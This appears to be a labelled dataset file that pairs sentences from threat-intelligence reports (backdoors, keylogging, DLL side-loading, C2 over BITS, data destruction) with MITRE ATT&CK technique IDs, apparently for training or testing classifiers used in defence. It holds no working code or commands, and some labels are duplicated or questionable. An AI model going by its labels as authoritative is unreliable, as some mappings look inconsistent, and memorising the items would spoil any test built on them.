text1	labels
creates a backdoor through which remote attackers can steal system information.	['T1005', 'T1005']
captures window titles.	['T1010', 'T1010']
hides any strings related to its own indicators of compromise.	['T1027', 'T1027']
creates a backdoor through which remote attackers can open a command-line interface.	['T1059', 'T1059']
stages collected data in a text file.	['T1074', 'T1074']
can download and execute a second-stage payload.	['T1105', 'T1105']
creates a backdoor through which remote attackers can upload files.	['T1105', 'T1105']
creates a Registry subkey that registers a new system device.	['T1112', 'T1112']
At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse	['T1564.001', 'T1564.001']
If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards	['T1204.002', 'T1105']
For both the receiving of C2 commands and exfiltration, Remexi uses the Microsoft Background Intelligent Transfer Service (BITS) mechanism to communicate with the C2 over HTTP	['T1071.001', 'T1041', 'T1071', 'T1132']
The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs	['T1056.001', 'T1056']
f) Hadoop YARN ResourceManager – Command Execution (exploit) g) CVE-2016-3088: Apache ActiveMQ Fileserver File Upload Remote Code Execution Vulnerability	['T1203', 'T1203', 'T1105']
The malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems	['T1053.005', 'T1053', 'T1053.005']
"""beacon"" payload can collect information on process details."	['T1057']
"""beacon"" payload can receive C2 from one protocol and respond on another. This is typically a mixture of HTTP, HTTPS, and DNS traffic."	['T1026']
"""beacon"" payload is capable of capturing screen shots."	['T1113']
"2 contains a ""Destroy"" plug-in that destroys data stored on victim hard drives by overwriting file contents."	['T1070.004']
A  .dll file is digitally signed by a certificate from AirVPN.	['T1553.002']
A  .dll that contains  is loaded and executed using DLL side-loading.	['T1574.002']
A  2 plug-in uses WMI to gather victim host details.	['T1047']
A backdoor used by  created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network.	['T1090.003']
abuses NTFS transactions to launch and conceal malicious processes.	['T1055.013']
abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.	['T1574.001']
